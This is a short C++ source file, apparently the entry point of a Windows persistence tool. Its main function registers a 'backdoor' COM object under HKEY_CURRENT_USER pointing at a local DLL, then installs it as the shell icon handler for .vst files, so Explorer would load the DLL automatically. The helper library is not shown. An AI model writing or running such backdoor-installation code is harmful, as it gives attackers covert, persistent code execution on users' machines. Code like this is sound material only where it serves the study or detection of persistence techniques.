#include "reg.h"



int wmain()
{

	std::wstring dllPath = L"C:\\Users\\AliSAhmad\\source\\repos\\Test004\\x64\\Debug\\ATLIconHandler.dll";
	GUID guid = reg::CreateBackdoorObj(HKCU, dllPath);
	std::wstring ext = L".vst";
	reg::AddTechnique(ICON_HANDLER, (WCHAR *)ext.c_str(), guid);

}
